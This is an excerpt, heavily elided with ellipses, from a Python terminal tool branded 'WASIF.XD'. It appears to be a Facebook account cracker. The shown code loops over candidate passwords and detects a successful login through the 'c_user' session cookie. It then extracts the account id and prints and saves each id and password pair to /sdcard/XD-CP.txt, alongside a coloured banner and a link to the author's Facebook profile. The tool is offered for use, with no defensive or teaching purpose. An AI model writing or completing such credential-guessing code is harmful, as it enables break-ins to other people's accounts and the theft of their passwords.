...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100037255963692')
        FD()
        return None
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mWASIF.XD\33[0;m\033[1;32m && \033[1;33mGAMING\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m WASIF.XD
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mWASIFX313
...
\033[1;37m================= \33[32;45mWASIF.XD\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO WASIF.XDTOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(XD-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/XD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[XD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
